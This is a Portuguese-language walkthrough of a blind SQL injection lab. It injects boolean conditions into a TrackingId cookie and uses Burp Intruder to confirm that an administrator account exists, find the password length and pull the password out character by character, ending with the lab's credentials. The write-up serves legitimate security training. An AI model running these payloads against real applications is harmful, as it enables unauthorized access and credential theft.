@@ -1,0 +1,125 @@
+__________________________________________________
+\\Blind SQL injection with conditional responses//
+-------------------------------------------------- 
+
+Vamos Utilizar o BurpSuite
+
+A vulnerabilidade está no cookie de tracking
+Cookie: TrackingId=xLIAoOA9683JlDTt; session=axc4vCZh1Zf6JqAdczIfJ3Nm9SoVcF8K
+
+Vamos enviar a requisição para o repeater.
+Podemos enviar a requisição para o comparer para ver o que foi mudado.
+
+Vamos dar um send para ver se retorna o:
+Welcome back! - Está descrito na descrição do laboratório.
+
+Vamos colocar aspas simples no meio do cookie
+'
+Cookie: TrackingId=xLIAoOA'9683JlDTt; session=axc4vCZh1Zf6JqAdczIfJ3Nm9SoVcF8K
+|-> A query não vai devolver nenhum resultado.
+        |-> EX: Welcome back!
+
+
+Vamos testar a injeção:
+Injeção 1: cookie_valido' AND 1=1--
+Query: SELECT * FROM TrackedUsers WHERE tracking_id='cookie_valido' AND 1=1';
+Resultado: A aplicação devolve a mensagem 'welcome back'
+
+Query: SELECT * FROM TrackedUsers WHERE tracking_id='cookie_valido' AND 1=2';
+Injeção 2> cookie_valido' AND 1=2--
+Resultado: A aplicação não devolve a mensagem 'welcome back'
+
+Vamos colocar em prática
+Cookie: TrackingId=xLIAoOA9683JlDTt'AND 1=1--; - Não retorna erro
+Cookie: TrackingId=xLIAoOA9683JlDTt'AND 1=2--; - Retorna erro (falso)
+
+Adaptar o payload - Vamos confirmar que existe um usuário cujo username é 'administrator'
+
+Injeção: cookie_valido' AND (SELECT username FROM users WHERE username='administrator')='administrator'--
+Query: SELECT * FROM TrackedUsers WHERE tracking_id='cookie_valido' AND (SELECT username FROM users WHERE username='administrator')='administrator'--;
+    |                                   --------------------------- AND ---------------------------------------------------------------------------
+    |                                        VERDADEIRO                          'administrator'                                     'administrator'
+    |                                        VERDADEIRO                         --------------------------------------------------------------------
+    |                                                                                                        VERDADEIRO                                                                                      
+    |-> Devolve a mensagem welcome bacadk
+            |-> Verdadeiro
+
+_____________________________________________________
+Vamos procurar por uma conta de usuário que não existe
+Injeção 2: cookie_valido' AND (SELECT username FROM users WHERE username='userRandom')='userRandom'-- 
+Query: SELECT * FROM TrackedUsers WHERE tracking_id='cookie_valido' AND (SELECT username FROM users WHERE username='userRandom')='userRandom'--';
+            |                           --------------------------- AND  ------------------------------------------------------ = -------------
+            |                                    VERDADEIRO                        ''                                            = 'userRandom'
+            |                                                             ----------------------------------------------------------------------
+            |                                    VERDADEIRO          AND                               Falso
+            |-> Query não devolve registros = mensagem 'welcome back' não retornada para a aplicação.
+
+
+Como sabemos que existe um usuário cujo username é 'administrator', vamos agora tentar descobrir qual é a respectiva
+    password.
+
+Injeção: cookie_valido' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=1)='a'--
+Resposta: A aplicação não devolve a mensagem 'welcome back'
+
+Conclusão: Se a password tiver apenas 1 caractere, a resposta a está injeção terá a mensagem 'welcome back'
+    Caso a mensagem não apareça, temos que testar outros valores (2,3,4,5..) até descobrir o tamanho
+
+
+Podemos colocar sinal de >
+Cookie: TrackingId=BRvtWAoEwBU5FyIX' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a'--; | dá erro
+
+Podemos colocar sinal de = para ver quantidade exata
+Cookie: TrackingId=BRvtWAoEwBU5FyIX' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a'--; | não gera erro
+
+Vamos utilizar o intruder
+ AND LENGTH(password)=$20$)='a'--
+    
+Vamos adicionar valores de 1 a 30 para testar
+
+Vamos em options e em Grep - match colocoamos a mensagem que aparece na aplicação.
+Welcome back!
+
+Resposta: Cookie: TrackingId=BRvtWAoEwBU5FyIX' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a'--; 
+
+>>>>Agora sabemos que o password tem 20 caracteres<<<<<<<
+--------------------------------------------------------
+
+Vamos descobrir os 20 caracteres do password.
+
+Injeção: ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
+Query: SELECT trackid FROM TrackedUsers WHERE track_id=' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
+Resposta: A aplicação não devolve a mensagem 'Welcome Back'
+
+Conclusão: Se o primeiro caractere de password do usuário com username 'aministrator' for 'a', a aplicação
+            deve devolver a mensagem welcome back. Se não devolver, a primeira palavra não é a.
+
+
+Vamos utilizar o intruder
+attack type: cluster bomb
+
+Ex: SUBSTRING(password,1,1)='a'--
+                     | --   ---
+                     | 1     | a
+       Payload 1-----| .     | z
+                     | .     | 0
+                     | 20    | 9
+      Payload 2--------------|
+
+
+Vamos no intruder construir nosso payload
+Cookie: TrackingId=BRvtWAoEwBU5FyIX' AND (SELECT SUBSTRING(password,$1$,1) FROM users WHERE username='administrator')='$a$'--
+
+                                   
+Escolher cluster bomb
+
+Em payloads, vamos criar as listas.
+em payload set 1 vamos colocar os caracteres de 1 a 20
+em payload set 2 vamos colocar de 0-9 e de a-z
+
+Em opções vamos em grep-match e vamos colocar:
+Welcome
+
+Vamos marcar: flag result items
+
+username: administrator
+Senha: qjt2y5avkgv95sp586pj
